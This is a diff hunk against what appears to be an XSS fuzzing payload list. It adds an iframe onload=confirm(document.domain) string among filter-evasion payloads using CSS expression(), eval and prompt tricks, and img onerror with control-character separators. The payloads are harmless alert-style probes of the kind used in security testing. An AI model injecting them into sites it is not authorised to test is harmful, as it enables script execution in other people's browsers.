@@ -7,6 +7,7 @@
 "'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
 "-eval("window['pro'%2B'mpt'](8)")-"
 "-prompt(8)-"
+;1lblah"<iframe/onload=confirm(document.domain);></i>"
 "/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
 "/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
 "/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
